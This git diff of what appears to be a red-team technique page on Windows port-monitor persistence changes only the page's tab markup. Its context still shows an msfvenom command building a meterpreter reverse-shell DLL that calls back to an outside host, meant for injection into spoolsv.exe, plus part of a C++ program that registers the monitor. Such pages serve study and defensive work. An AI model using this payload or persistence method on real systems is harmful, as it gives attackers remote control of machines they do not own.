@@ -8,18 +8,18 @@ description: 'Persistence, Privilege Escalation'
 
 Generating a 64-bit meterpreter payload to be injected into the spoolsv.exe:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@local" %}
+{% tabs %}
+{% tab title="attacker@local" %}
 ```csharp
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f dll > evil64.dll
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 Writing and compiling a simple C++ code that will register the monitor port:
 
-{% code-tabs %}
-{% code-tabs-item title="monitor.cpp" %}
+{% tabs %}
+{% tab title="monitor.cpp" %}
 ```cpp
 #include "stdafx.h"
 #include "Windows.h"
@@ -36,8 +36,8 @@ int main() {
 	return 0;
 }
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 {% file src="../../.gitbook/assets/t1013-portmonitor64.exe" caption="PortMonitor64" %}
 
